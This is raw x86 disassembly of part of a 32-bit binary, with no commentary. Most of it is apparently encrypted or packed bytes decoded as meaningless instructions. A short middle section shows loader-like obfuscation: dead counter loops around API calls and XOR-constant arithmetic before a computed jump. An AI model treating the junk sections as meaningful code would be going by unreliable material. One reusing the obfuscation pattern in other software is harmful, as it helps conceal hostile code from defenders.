  41a6c1:	loopne 0x41a6fd
  41a6c3:	(bad)  
  41a6c4:	sti    
  41a6c5:	xchg   ebp,eax
  41a6c6:	or     DWORD PTR [ebx],esp
  41a6c8:	imul   edi,DWORD PTR [edx-0x42],0x1e
  41a6cc:	leave  
  41a6cd:	pop    ecx
  41a6ce:	clc    
  41a6cf:	rcr    BYTE PTR [esi-0x50],cl
  41a6d2:	xchg   DWORD PTR [esi+ecx*1+0xfd30f5f],ecx
  41a6d9:	std    
  41a6da:	retf   
  41a6db:	sbb    DWORD PTR [edi-0x21],esp
  41a6de:	mov    esp,ecx
  41a6e0:	jmp    0xcd50:0x1adc93b
  41a6e7:	ins    DWORD PTR es:[edi],dx
  41a6e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e9:	cmp    ebx,DWORD PTR [ecx+0x6f]
  41a6ec:	jl     0x41a6fc
  41a6ee:	sub    al,0x17
  41a6f0:	ret    0x9820
  41a6f3:	dec    esp
  41a6f4:	pop    ebp
  41a6f5:	mov    ds:0xbd6612f5,eax
  41a6fa:	adc    BYTE PTR [eax+0x416eface],bl
  41a700:	div    DWORD PTR [esi+0x6b]
  41a703:	scas   eax,DWORD PTR es:[edi]
  41a704:	aad    0xf3
  41a706:	leave  
  41a707:	cmp    esp,DWORD PTR [edi-0x29e0c93a]
  41a70d:	inc    esp
  41a70e:	inc    ebp
  41a710:	sbb    ah,BYTE PTR [ebx+0x2e3f26f6]
  41a716:	adc    DWORD PTR [eax],0xf
  41a719:	dec    ebp
  41a71a:	add    al,0x10
  41a71c:	int    0x20
  41a71e:	mov    ebp,0xc3461a17
  41a723:	adc    eax,0x35c90ab7
  41a728:	imul   BYTE PTR [eax+0x6fa828c8]
  41a72e:	push   0x7b
  41a730:	push   0x2a
  41a732:	xchg   ebp,eax
  41a733:	rcr    BYTE PTR [ecx+0x45ee1529],cl
  41a739:	xchg   ebp,eax
  41a73a:	outs   dx,BYTE PTR ds:[esi]
  41a73b:	dec    edi
  41a73c:	(bad)  
  41a73d:	pop    ss
  41a73e:	imul   ebx,DWORD PTR [edx+0x4d],0xa22cb0d
  41a745:	popa   
  41a746:	leave  
  41a747:	outs   dx,BYTE PTR ds:[esi]
  41a748:	lock mov eax,ds:0xd89ae103
  41a74e:	jl     0x41a6f5
  41a750:	pop    edx
  41a751:	lods   eax,DWORD PTR ds:[esi]
  41a752:	sbb    esi,DWORD PTR [edi+0x250a502a]
  41a758:	jge    0x41a7ce
  41a75a:	mov    ebp,0x550f0b8d
  41a75f:	pop    eax
  41a760:	or     BYTE PTR [edi-0x80],bh
  41a763:	xchg   esi,eax
  41a764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a765:	(bad)  
  41a766:	imul   edx,DWORD PTR [esi-0x63],0x2a
  41a76a:	arpl   WORD PTR [edi-0x48a938e7],sp
  41a770:	jmp    0xb317b205
  41a775:	sub    bh,BYTE PTR [ebx+0x70]
  41a778:	stc    
  41a779:	adc    eax,0x814a2ca3
  41a77e:	and    ebx,esi
  41a780:	xchg   ebx,eax
  41a781:	mov    edi,DWORD PTR [ecx-0x3d]
  41a784:	xlat   BYTE PTR ds:[ebx]
  41a785:	icebp  
  41a786:	lahf   
  41a787:	int    0xe1
  41a789:	xor    DWORD PTR [ecx*1+0x2c9be59e],edx
  41a790:	mov    edi,0x4aecfb5e
  41a795:	mov    esp,0x2990aed4
  41a79a:	loop   0x41a779
  41a79c:	xchg   DWORD PTR [esi+0x2065e019],esp
  41a7a2:	mov    ds:0x9b9812a4,eax
  41a7a7:	cmp    al,BYTE PTR [edi-0x2538c61c]
  41a7ad:	inc    edx
  41a7ae:	in     al,dx
  41a7af:	or     ebp,DWORD PTR [ebx+ebx*2+0x41]
  41a7b3:	inc    edi
  41a7b4:	nop
  41a7b5:	push   ebp
  41a7b6:	cmp    BYTE PTR [esi],dl
  41a7b8:	push   ss
  41a7b9:	test   eax,0xefa7f35f
  41a7be:	xchg   esi,eax
  41a7bf:	mov    bl,dl
  41a7c1:	inc    ebp
  41a7c2:	mov    ebx,0xe47449f8
  41a7c7:	push   ebx
  41a7c8:	mov    dh,0xb2
  41a7ca:	jo     0x41a843
  41a7cc:	mov    bh,0x74
  41a7ce:	adc    al,0xd2
  41a7d0:	inc    ecx
  41a7d1:	test   DWORD PTR [eax+0x4b],ecx
  41a7d4:	xor    esp,ecx
  41a7d6:	or     esp,DWORD PTR [edx+0x44f44f11]
  41a7dc:	inc    ecx
  41a7dd:	inc    edx
  41a7de:	xor    BYTE PTR [ecx-0x1b68847f],0x1e
  41a7e5:	pop    esp
  41a7e6:	push   edi
  41a7e7:	dec    esi
  41a7e8:	iret   
  41a7e9:	mov    esp,0x9d481340
  41a7ee:	popa   
  41a7ef:	jge    0x41a81b
  41a7f1:	add    eax,0x499c25f
  41a7f6:	daa    
  41a7f7:	push   esp
  41a7f8:	pusha  
  41a7f9:	add    al,0x9e
  41a7fb:	fcmovb st,st(5)
  41a7fd:	and    bl,BYTE PTR cs:[edx+eax*8]
  41a801:	cmc    
  41a802:	pop    ds
  41a803:	mov    es,WORD PTR [ecx+0x34]
  41a806:	mov    ah,bl
  41a808:	iret   
  41a809:	jno    0x41a7cc
  41a80b:	mov    esi,ecx
  41a80d:	xchg   DWORD PTR [esi],esp
  41a80f:	sub    al,ch
  41a811:	repz sub dl,0x6e
  41a815:	and    ebp,DWORD PTR [ecx-0x28]
  41a818:	mov    WORD PTR [esi+0x1b],gs
  41a81b:	mov    ecx,0xec2e470
  41a820:	retf   
  41a821:	outs   dx,DWORD PTR ds:[esi]
  41a822:	xchg   ebx,eax
  41a823:	in     al,0xd4
  41a825:	inc    edx
  41a826:	sbb    al,BYTE PTR [eax+ebx*4+0x177fea34]
  41a82d:	dec    esp
  41a82e:	or     esi,0x2
  41a831:	xlat   BYTE PTR ds:[ebx]
  41a832:	retf   
  41a833:	mov    bh,0x65
  41a835:	rol    dl,cl
  41a837:	cmp    eax,0x5775686c
  41a83c:	mov    al,ds:0x631560cb
  41a841:	inc    edi
  41a842:	pop    edx
  41a843:	(bad)
  41a847:	mov    DWORD PTR [ecx],edx
  41a849:	ins    DWORD PTR es:[edi],dx
  41a84a:	(bad)  
  41a84b:	jle    0x41a82d
  41a84d:	dec    edx
  41a84e:	or     al,0x65
  41a850:	popf   
  41a851:	arpl   ax,ax
  41a853:	push   0xdacf101c
  41a858:	outs   dx,DWORD PTR ds:[esi]
  41a859:	mov    bh,0xd1
  41a85b:	mov    bh,0x0
  41a85d:	out    0x89,eax
  41a85f:	int    0xd8
  41a861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a862:	ret    
  41a863:	cmp    edi,0xe2663769
  41a869:	icebp  
  41a86a:	mov    al,0xa
  41a86c:	retf   
  41a86d:	mov    WORD PTR [ebx+0x55],cs
  41a870:	sub    al,0x6a
  41a872:	shl    ecx,0x4e
  41a875:	mov    eax,0x4385a24c
  41a87a:	lock dec edx
  41a87c:	sar    BYTE PTR [edx],0x5c
  41a87f:	xor    eax,0x25bd1579
  41a884:	fisttp WORD PTR [edi-0x1e]
  41a887:	pusha  
  41a888:	and    BYTE PTR [esi-0xe],ch
  41a88b:	mov    bh,0x13
  41a88d:	sar    DWORD PTR [edi],0xb9
  41a890:	xor    esp,DWORD PTR [eax+0x2e1446c2]
  41a896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a897:	mov    dl,0x54
  41a899:	pop    ds
  41a89a:	test   dh,0xd3
  41a89d:	and    dl,0xc7
  41a8a0:	add    ebp,esp
  41a8a2:	mov    ds:0xbb7a91cc,eax
  41a8a7:	popf   
  41a8a8:	(bad)  [edi+0x3b]
  41a8ab:	mov    ebx,0x53cce4f1
  41a8b0:	int    0x69
  41a8b2:	fadd   DWORD PTR [edi]
  41a8b4:	leave  
  41a8b5:	mov    eax,0xf55c7f2
  41a8ba:	mov    al,0xe1
  41a8bc:	adc    DWORD PTR [edx],ebp
  41a8be:	cmp    ch,dh
  41a8c0:	add    eax,0x6d480b43
  41a8c5:	jno    0x41a8ed
  41a8c7:	je     0x41a932
  41a8c9:	mov    bh,0x19
  41a8cb:	leave  
  41a8cc:	inc    ebp
  41a8cd:	jmp    0x5cba8659
  41a8d2:	enter  0xb73f,0xcd
  41a8d6:	(bad)  
  41a8d7:	mov    edx,0xb32d9f98
  41a8dc:	inc    ebp
  41a8dd:	ds jb  0x8d5b6da5
  41a8e4:	pop    ebp
  41a8e5:	or     BYTE PTR [edi+esi*1-0x6d],0xff
  41a8ea:	cdq    
  41a8eb:	xchg   ecx,eax
  41a8ec:	ret    
  41a8ed:	sar    BYTE PTR [ebp-0x57],cl
  41a8f0:	adc    eax,ecx
  41a8f2:	mov    ecx,0x1323519f
  41a8f7:	shl    BYTE PTR [ebp+0x4a40baa0],1
  41a8fd:	pop    ds
  41a8fe:	(bad)  
  41a8ff:	xor    BYTE PTR [ebp-0x38],cl
  41a902:	xor    ebx,ebx
  41a904:	int3   
  41a905:	pop    ds
  41a906:	add    ebp,ecx
  41a908:	bound  eax,QWORD PTR ds:0x5fe0437
  41a90e:	xchg   ecx,eax
  41a90f:	repz jns 0x41a8ec
  41a912:	pop    es
  41a913:	jb     0x41a8e2
  41a915:	or     DWORD PTR [ebp+ebx*4+0x4d11c016],eax
  41a91c:	imul   ebp,DWORD PTR [ebp+0x7059604c],0x52e7cd93
  41a926:	cmc    
  41a927:	icebp  
  41a928:	(bad)  
  41a92a:	inc    esp
  41a92b:	jmp    0x215e:0xb1941008
  41a932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a933:	fcom   DWORD PTR [edi-0x60]
  41a936:	mov    si,0x4d2
  41a93a:	shl    BYTE PTR [eax-0x6e],1
  41a93d:	xor    BYTE PTR [esi-0x77599333],ah
  41a943:	int    0xdb
  41a945:	jne    0x41a93b
  41a947:	(bad)  
  41a948:	jnp    0x41a9bb
  41a94a:	(bad)  
  41a94b:	pop    esp
  41a94c:	push   0xffffffe5
  41a94e:	nop
  41a94f:	pop    ebx
  41a950:	mov    DWORD PTR [edx],0x2c755194
  41a956:	int3   
  41a957:	imul   esp,DWORD PTR ds:0x5f941521,0xffffff8e
  41a95e:	loop   0x41a94c
  41a960:	and    esp,0xffffffcc
  41a963:	add    al,0x3d
  41a965:	push   ebp
  41a966:	mov    bl,0x3e
  41a968:	jg     0x41a90a
  41a96a:	mov    bh,0x83
  41a96c:	or     DWORD PTR [edx+eiz*1],eax
  41a96f:	push   ecx
  41a970:	(bad)  
  41a971:	mov    edx,0x8403f18
  41a976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a977:	out    0xc7,eax
  41a979:	not    BYTE PTR [ebx-0x3dc84002]
  41a97f:	sar    DWORD PTR [esi],1
  41a981:	clc    
  41a982:	adc    BYTE PTR ds:0x6af84cf1,0xef
  41a989:	aas    
  41a98a:	jnp    0x41a9df
  41a98c:	adc    eax,eax
  41a98e:	mov    DWORD PTR [ebp-0x18],0xce941f82
  41a995:	add    DWORD PTR ds:0x426858,ecx
  41a99b:	mov    eax,0xffff2df0
  41a9a0:	sub    DWORD PTR ds:0x4267f0,0x4f89
  41a9aa:	mov    DWORD PTR [ebp-0x14],eax
  41a9ad:	mov    DWORD PTR ds:0x426804,0x1b
  41a9b7:	cmp    DWORD PTR ds:0x426804,0x0
  41a9be:	je     0x41a9fc
  41a9c4:	cmp    DWORD PTR ds:0x426804,0x23
  41a9cb:	ja     0x41a9fc
  41a9d1:	jmp    0x41a9ea
  41a9d6:	push   0x4267f0
  41a9db:	push   DWORD PTR [ebp-0x1c]
  41a9de:	push   DWORD PTR [ebp-0x1c]
  41a9e1:	push   DWORD PTR [ebp-0x14]
  41a9e4:	call   DWORD PTR ds:0x425780
  41a9ea:	mov    ebx,DWORD PTR ds:0x426804
  41a9f0:	dec    ebx
  41a9f1:	mov    DWORD PTR ds:0x426804,ebx
  41a9f7:	jmp    0x41a9b7
  41a9fc:	push   esi
  41a9fd:	mov    DWORD PTR [ebp-0x38],0xce941f81
  41aa04:	and    ebx,DWORD PTR ds:0x4267ec
  41aa0a:	mov    DWORD PTR [ebp-0x34],eax
  41aa0d:	push   edi
  41aa0e:	xor    eax,eax
  41aa10:	mov    eax,DWORD PTR [ebp-0x10]
  41aa13:	or     DWORD PTR ds:0x426820,edx
  41aa19:	mov    ecx,DWORD PTR [ebp-0x10]
  41aa1c:	sub    eax,ecx
  41aa1e:	and    DWORD PTR ds:0x4267bc,0x0
  41aa28:	mov    esi,DWORD PTR ds:0x4267bc
  41aa2e:	inc    esi
  41aa2f:	mov    DWORD PTR ds:0x4267bc,esi
  41aa35:	cmp    DWORD PTR ds:0x4267bc,0x29
  41aa3c:	jg     0x41aa63
  41aa42:	jmp    0x41aa56
  41aa47:	push   DWORD PTR [ebp-0x18]
  41aa4a:	push   DWORD PTR [ebp-0x14]
  41aa4d:	push   DWORD PTR [ebp-0x10]
  41aa50:	call   DWORD PTR ds:0x425784
  41aa56:	cmp    DWORD PTR ds:0x4267bc,0x1f
  41aa5d:	jb     0x41aa28
  41aa63:	mov    DWORD PTR [ebp-0x10],eax
  41aa66:	and    DWORD PTR ds:0x426830,0x0
  41aa70:	mov    esi,DWORD PTR ds:0x426830
  41aa76:	inc    esi
  41aa77:	mov    DWORD PTR ds:0x426830,esi
  41aa7d:	cmp    DWORD PTR ds:0x426830,0x6
  41aa84:	jbe    0x41aac1
  41aa8a:	jmp    0x41aa9a
  41aa8f:	push   0x4f9f
  41aa94:	call   DWORD PTR ds:0x425788
  41aa9a:	cmp    DWORD PTR ds:0x426830,0x5
  41aaa1:	jne    0x41aab4
  41aaa7:	mov    esi,DWORD PTR ds:0x426830
  41aaad:	inc    esi
  41aaae:	mov    DWORD PTR ds:0x426830,esi
  41aab4:	cmp    DWORD PTR ds:0x426830,0x10
  41aabb:	jb     0x41aa70
  41aac1:	xor    DWORD PTR [ebp-0x10],0xbd8da5b0
  41aac8:	xor    DWORD PTR ds:0x4267f0,edi
  41aace:	mov    eax,DWORD PTR [ebp-0x1c]
  41aad1:	sub    esi,DWORD PTR ds:0x4267b4
  41aad7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41aada:	sub    eax,ecx
  41aadc:	and    DWORD PTR ds:0x426800,0x0
  41aae6:	mov    edi,DWORD PTR ds:0x426800
  41aaec:	inc    edi
  41aaed:	mov    DWORD PTR ds:0x426800,edi
  41aaf3:	cmp    DWORD PTR ds:0x426800,0xf
  41aafa:	ja     0x41ab3a
  41ab00:	jmp    0x41ab13
  41ab05:	push   DWORD PTR [ebp-0x24]
  41ab08:	push   0x426142
  41ab0d:	call   DWORD PTR ds:0x4257b0
  41ab13:	cmp    DWORD PTR ds:0x426800,0xe
  41ab1a:	jne    0x41ab2d
  41ab20:	mov    edi,DWORD PTR ds:0x426800
  41ab26:	inc    edi
  41ab27:	mov    DWORD PTR ds:0x426800,edi
  41ab2d:	cmp    DWORD PTR ds:0x426800,0x18
  41ab34:	jb     0x41aae6
  41ab3a:	mov    DWORD PTR [ebp-0x1c],eax
  41ab3d:	movzx  ecx,BYTE PTR ds:0x4267e8
  41ab44:	add    ecx,DWORD PTR ds:0x4267b8
  41ab4a:	mov    DWORD PTR ds:0x4267e8,ecx
  41ab50:	or     DWORD PTR [ebp-0x1c],0xbd8e15b0
  41ab57:	mov    DWORD PTR ds:0x4267e0,0x1b
  41ab61:	cmp    DWORD PTR ds:0x4267e0,0x0
  41ab68:	je     0x41aba6
  41ab6e:	cmp    DWORD PTR ds:0x4267e0,0x29
  41ab75:	jle    0x41aba6
  41ab7b:	jmp    0x41ab94
  41ab80:	push   DWORD PTR [ebp-0x10]
  41ab83:	push   DWORD PTR [ebp-0x18]
  41ab86:	push   0x58ae
  41ab8b:	push   DWORD PTR [ebp-0x18]
  41ab8e:	call   DWORD PTR ds:0x42578c
  41ab94:	mov    edi,DWORD PTR ds:0x4267e0
  41ab9a:	dec    edi
  41ab9b:	mov    DWORD PTR ds:0x4267e0,edi
  41aba1:	jmp    0x41ab61
  41aba6:	mov    eax,DWORD PTR [ebp-0xc]
  41aba9:	mov    ecx,DWORD PTR [ebp-0xc]
  41abac:	sub    eax,ecx
  41abae:	mov    esi,DWORD PTR ds:0x426818
  41abb4:	xor    DWORD PTR ds:0x426820,esi
  41abba:	mov    DWORD PTR [ebp-0xc],eax
  41abbd:	and    eax,ebx
  41abbf:	or     DWORD PTR [ebp-0xc],0xbd8d95f0
  41abc6:	adc    edi,ecx
  41abc8:	mov    eax,DWORD PTR [ebp-0x20]
  41abcb:	sub    DWORD PTR ds:0x4267b4,ebx
  41abd1:	mov    ecx,DWORD PTR [ebp-0x20]
  41abd4:	xor    edi,edi
  41abd6:	or     edi,DWORD PTR ds:0x4268a4
  41abdc:	mov    esi,DWORD PTR ds:0x4268cc
  41abe2:	sub    esi,edi
  41abe4:	imul   edi,DWORD PTR [edi+esi*1]
  41abe8:	sub    eax,ecx
  41abea:	mov    DWORD PTR [ebp-0x20],eax
  41abed:	or     DWORD PTR [ebp-0x20],0xbd8d9590
  41abf4:	mov    eax,DWORD PTR [ebp-0x24]
  41abf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41abfa:	sub    eax,ecx
  41abfc:	mov    DWORD PTR [ebp-0x24],eax
  41abff:	mov    eax,DWORD PTR [ebp-0x18]
  41ac02:	mov    ecx,DWORD PTR [ebp-0x14]
  41ac05:	mov    ecx,DWORD PTR [ebp-0x24]
  41ac08:	xor    eax,0x6729a14b
  41ac0d:	mov    ebx,0x56424137
  41ac12:	add    eax,ebx
  41ac14:	or     eax,ecx
  41ac16:	mov    DWORD PTR [ebp-0x24],eax
  41ac19:	mov    eax,DWORD PTR [ebp-0x4]
  41ac1c:	mov    ecx,DWORD PTR [ebp-0x4]
  41ac1f:	sub    eax,ecx
  41ac21:	mov    DWORD PTR [ebp-0x4],eax
  41ac24:	or     DWORD PTR [ebp-0x4],0xbd8d95bf
  41ac2b:	mov    eax,DWORD PTR [ebp-0xc]
  41ac2e:	mov    esi,0x751018b5
  41ac33:	xor    eax,esi
  41ac35:	mov    edi,0x376272fb
  41ac3a:	add    eax,edi
  41ac3c:	push   eax
  41ac3d:	mov    eax,DWORD PTR [ebp-0x10]
  41ac40:	xor    eax,esi
  41ac42:	add    eax,edi
  41ac44:	push   eax
  41ac45:	mov    eax,DWORD PTR [ebp-0x4]
  41ac48:	xor    eax,esi
  41ac4a:	add    eax,0x376272ff
  41ac4f:	push   eax
  41ac50:	lea    eax,[ebp-0x80]
  41ac53:	push   eax
  41ac54:	call   0x418205
  41ac59:	test   eax,eax
  41ac5b:	je     0x41ac8f
  41ac61:	lea    eax,[ebp-0x80]
  41ac64:	push   eax
  41ac65:	mov    eax,DWORD PTR [ebp-0x38]
  41ac68:	mov    ecx,DWORD PTR [ebp-0x34]
  41ac6b:	xor    eax,0x6729a14b
  41ac70:	add    eax,ebx
  41ac72:	push   eax
  41ac73:	mov    eax,DWORD PTR [ebp-0x28]
  41ac76:	add    eax,0xaa
  41ac7b:	push   eax
  41ac7c:	mov    eax,DWORD PTR [ebp-0x28]
  41ac7f:	mov    eax,DWORD PTR [eax+0x198]
  41ac85:	push   DWORD PTR [eax]
  41ac87:	call   0x40c883
  41ac8c:	mov    DWORD PTR [ebp-0x14],eax
  41ac8f:	mov    ecx,DWORD PTR ds:0x426540
  41ac95:	lea    eax,[ebp+0x4]
  41ac98:	mov    DWORD PTR [ecx*4+0x426538],eax
  41ac9f:	inc    DWORD PTR ds:0x426540
  41aca5:	mov    eax,DWORD PTR [ebp-0x14]
  41aca8:	sub    eax,edi
  41acaa:	xor    eax,esi
  41acac:	mov    ecx,0xbd8d95b0
  41acb1:	cmp    eax,ecx
  41acb3:	je     0x41f3f5
  41acb9:	lea    eax,[ebp-0x8]
  41acbc:	mov    DWORD PTR [ebp-0x30],eax
  41acbf:	mov    eax,DWORD PTR [ebp-0x2c]
  41acc2:	mov    DWORD PTR [ebp-0x8],eax
  41acc5:	mov    eax,DWORD PTR [ebp-0x8]
  41acc8:	mov    edx,DWORD PTR [ebp-0x14]
  41accb:	sub    eax,edx
  41accd:	mov    DWORD PTR [ebp-0x8],eax
  41acd0:	mov    edx,DWORD PTR [ebp-0x4]
  41acd3:	xor    edx,esi
  41acd5:	mov    eax,0xc89d8d05
  41acda:	sub    eax,edx
  41acdc:	add    DWORD PTR [ebp-0x8],eax
  41acdf:	jmp    0x41d047
  41ace4:	mov    ebx,DWORD PTR [ebp+0x74347732]
  41acea:	into   
  41aceb:	gs adc eax,0x20d08459
  41acf1:	xchg   esp,eax
  41acf2:	xchg   esi,eax
  41acf3:	ret    
  41acf4:	pushf  
  41acf5:	(bad)  
  41acf6:	jp     0x41ad73
  41acf8:	rcr    BYTE PTR [eax-0x14fa8485],0x4a
  41acff:	sbb    al,0x62
  41ad01:	add    DWORD PTR [ebx-0x25ae3764],0xffffffe0
  41ad08:	test   BYTE PTR [edx+edx*2],dh
  41ad0b:	sbb    bh,BYTE PTR [edi+0x7108483d]
  41ad11:	mov    ch,0x64
  41ad13:	sub    al,0xe5
  41ad15:	daa    
  41ad16:	sbb    dh,BYTE PTR [eax-0x1c158461]
  41ad1c:	xchg   esi,eax
  41ad1d:	rol    DWORD PTR [ecx],1
  41ad1f:	leave  
  41ad20:	sbb    al,0x34
  41ad22:	xor    al,0xa
  41ad24:	or     BYTE PTR [ebp+0x53c42ea3],cl
  41ad2a:	sub    BYTE PTR [edx-0x18],dh
  41ad2d:	mov    dh,0xe5
  41ad2f:	(bad)  
  41ad30:	push   ecx
  41ad31:	or     DWORD PTR [esi+0x79b71c29],esi
  41ad37:	jns    0x41ad06
  41ad39:	lods   al,BYTE PTR ds:[esi]
  41ad3a:	cmc    
  41ad3b:	pop    edi
  41ad3c:	ror    BYTE PTR [esi-0x17ff3c80],1
  41ad42:	jle    0x41ace9
  41ad44:	xor    BYTE PTR [ecx+0x19],bh
  41ad47:	jb     0x41ad4a
  41ad49:	arpl   sp,si
  41ad4b:	cli    
  41ad4c:	cmp    BYTE PTR [eax],0xca
  41ad4f:	ds or  eax,0x71298203
  41ad55:	test   BYTE PTR [ebx],bh
  41ad57:	mov    dh,0xc4
  41ad59:	push   esi
  41ad5a:	lods   al,BYTE PTR ds:[esi]
  41ad5b:	adc    al,ah
  41ad5d:	ret    0x3ed0
  41ad60:	sub    eax,0xd886751
  41ad65:	leave  
  41ad66:	imul   esp,edx,0x93e7ecb0
  41ad6c:	repnz scas eax,DWORD PTR es:[edi]
  41ad6e:	or     ebx,DWORD PTR [eax]
  41ad70:	lahf   
  41ad71:	push   es
  41ad72:	pop    edx
  41ad73:	fnstsw WORD PTR [eax-0x7b1e819e]
  41ad79:	and    al,0x8a
  41ad7b:	sub    BYTE PTR ds:0x798f584e,bl
  41ad81:	mov    dh,0xe1
  41ad83:	mov    ebx,0xe0341bb5
  41ad88:	inc    edx
  41ad89:	xor    DWORD PTR [esi],ecx
  41ad8b:	arpl   WORD PTR [ecx],bx
  41ad8d:	(bad)  
  41ad8e:	bound  esi,QWORD PTR [ebp+0x4]
  41ad91:	sub    DWORD PTR [ebx+edx*2],0xffffffa0
  41ad95:	xor    ecx,DWORD PTR [ebp+0x252bd034]
  41ad9b:	inc    edi
  41ad9c:	add    ebp,eax
  41ad9e:	(bad)  
  41ad9f:	jmp    0x32ec8ef3
  41ada4:	xchg   edi,eax
  41ada5:	shr    DWORD PTR [esi-0x404e28bd],0x58
  41adac:	fdivrp st(7),st
  41adae:	pop    edx
  41adaf:	ja     0x41ad87
  41adb1:	jecxz  0x41ae24
  41adb3:	(bad)  
  41adb4:	and    eax,DWORD PTR [eax+0x2a]
  41adb7:	pop    esi
  41adb8:	idiv   DWORD PTR [ecx]
  41adba:	xchg   edx,eax
  41adbb:	dec    esi
  41adbc:	adc    dh,BYTE PTR [ebx+0x64]
  41adbf:	xor    eax,0xfe406c31
  41adc4:	mov    ebp,0x8d33b6ce
  41adc9:	imul   ebp,DWORD PTR ds:0x966b45df,0xffffffe5
  41add0:	mov    dh,BYTE PTR [ebp+ecx*8+0xc3ea747]
  41add7:	or     al,0x54
  41add9:	xchg   edx,eax
  41adda:	shr    BYTE PTR [esi+eax*8+0x2a2d7319],cl
  41ade1:	xlat   BYTE PTR ds:[ebx]
  41ade2:	or     al,BYTE PTR [ebx+0x65]
  41ade5:	lds    esi,FWORD PTR [eax]
  41ade7:	sbb    al,dh
  41ade9:	(bad)  
  41adea:	scas   al,BYTE PTR es:[edi]
  41adeb:	gs mov edi,0x3ea90d9c
  41adf1:	and    eax,0xad6c8727
  41adf6:	push   esp
  41adf7:	jbe    0x41ad81
  41adf9:	xchg   DWORD PTR [ebx-0x43],edi
  41adfc:	sub    al,0xcd
  41adfe:	lods   eax,DWORD PTR ds:[esi]
  41adff:	dec    eax
  41ae00:	fisub  WORD PTR [esi-0x69]
  41ae03:	icebp  
  41ae04:	inc    eax
  41ae05:	adc    ch,dl
  41ae07:	or     BYTE PTR ds:[edi-0xb],dh
  41ae0b:	adc    bl,cl
  41ae0d:	clc    
  41ae0e:	cld    
  41ae0f:	push   es
  41ae10:	inc    ebp
  41ae11:	add    dh,BYTE PTR [esi+0x4]
  41ae14:	ja     0x41ae91
  41ae16:	sbb    BYTE PTR [ecx-0x69e492a6],0x7b
  41ae1d:	popf   
  41ae1e:	mov    ebx,0x7b35711e
  41ae23:	xor    DWORD PTR [esi-0x2f],ebp
  41ae26:	call   0xa2c2:0x9ee637a5
  41ae2d:	mov    ds:0xeaeb68ce,al
  41ae32:	sbb    eax,0xa4be3823
  41ae37:	jl     0x41ae42
  41ae39:	push   ebx
  41ae3a:	in     al,0x9c
  41ae3c:	in     al,0x0
  41ae3e:	push   edi
  41ae3f:	or     eax,0x889ef6ed
  41ae44:	popa   
  41ae45:	jbe    0x41ae71
  41ae47:	inc    esp
  41ae48:	sar    DWORD PTR [esi],0x6e
  41ae4b:	repz iret 
  41ae4d:	inc    eax
  41ae4e:	jle    0x41ae9e
  41ae50:	cwde   
  41ae51:	and    edi,eax
  41ae53:	dec    esp
  41ae54:	adc    ecx,DWORD PTR ds:0x62ecc600
  41ae5a:	adc    DWORD PTR [edi],0x46
  41ae5d:	and    DWORD PTR ds:0x44640060,ebp
  41ae63:	xchg   esp,eax
  41ae64:	jmp    FWORD PTR [edi+0x60]
  41ae67:	jmp    0x41aede
  41ae69:	push   ss
  41ae6a:	fcmove st,st(6)
  41ae6c:	push   ebx
  41ae6d:	push   cs
  41ae6e:	rcr    DWORD PTR [edi+0x6df05494],cl
  41ae74:	add    ch,BYTE PTR [edi]
  41ae76:	imul   eax,esp,0x6e
  41ae79:	pop    esi
  41ae7a:	jmp    0x41ae6e
  41ae7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae7d:	sub    DWORD PTR [edx+0x3a],esi
  41ae80:	pop    ss
  41ae81:	arpl   WORD PTR [ecx+0x5c8dd7ed],ax
  41ae87:	rcl    ecx,1
  41ae89:	xchg   ebp,eax
  41ae8a:	push   esi
  41ae8b:	xchg   ebp,eax
  41ae8c:	inc    ecx
  41ae8d:	(bad)  
  41ae8e:	adc    ecx,edi
  41ae90:	mov    es,WORD PTR [eax+0x10]
  41ae93:	dec    esi
  41ae94:	jmp    0x41af03
  41ae96:	adc    esi,DWORD PTR [eax-0x5a]
  41ae99:	pushf  
  41ae9a:	lods   eax,DWORD PTR ds:[esi]
  41ae9b:	add    BYTE PTR [ebp+0x73],0xac
  41ae9f:	lds    esi,FWORD PTR [eax+0x7b013f9d]
  41aea5:	xchg   ebp,eax
  41aea6:	jmp    0x7c13939d
  41aeab:	sub    eax,ecx
  41aead:	xlat   BYTE PTR ds:[ebx]
  41aeae:	out    0xf3,al
  41aeb0:	adc    BYTE PTR [edx],bh
  41aeb2:	xchg   esp,eax
  41aeb3:	or     BYTE PTR [ebx+0x71cc4a03],ch
  41aeb9:	scas   eax,DWORD PTR es:[edi]
  41aeba:	xchg   esi,eax
  41aebb:	or     BYTE PTR [eax+0x6d65c90],0x18
  41aec2:	ror    dl,0x3c
  41aec5:	and    BYTE PTR [ebx+0x43],ah
  41aec8:	jle    0x41aeaf
  41aeca:	fldenv [esi]
  41aecc:	hlt    
  41aecd:	and    al,0x9d
  41aecf:	xchg   ebp,eax
  41aed0:	xor    DWORD PTR [ecx-0x2a],ecx
  41aed3:	cmp    dh,cl
  41aed5:	imul   esp,DWORD PTR [ecx-0x14],0x296a58b3
  41aedc:	pop    esp
  41aedd:	and    eax,DWORD PTR [eax+0x34b50a26]
  41aee3:	(bad)  [esi+0x54d48160]
  41aee9:	xor    BYTE PTR [ebp+0x4799014c],ah
  41aeef:	sti    
  41aef0:	jnp    0x41ae94
  41aef2:	add    ecx,esp
  41aef4:	popf   
  41aef5:	cld    
  41aef6:	xchg   ebx,eax
  41aef7:	mov    ds:0x45fa10b3,eax
  41aefc:	inc    ebx
  41aefd:	mov    ds:0x5131149b,eax
  41af02:	iret   
  41af03:	movaps XMMWORD PTR [ecx-0x58833a44],xmm5
  41af0a:	jo     0x41aec9
  41af0c:	sub    BYTE PTR [ecx],0xe7
  41af0f:	xor    ecx,ebx
  41af11:	dec    esi
  41af12:	inc    ecx
  41af13:	pop    ebx
  41af14:	data16 loop 0x41aec2
  41af17:	imul   ebp,DWORD PTR [edx-0x44ba0fb3],0xf9fc5fd4
  41af21:	pop    bx
  41af23:	std    
  41af24:	icebp  
  41af25:	sbb    bh,BYTE PTR [edx]
  41af27:	inc    ebp
  41af28:	push   0x6dd6768d
  41af2d:	lds    edx,FWORD PTR [ebx+0x7ca27db1]
  41af33:	ds daa 
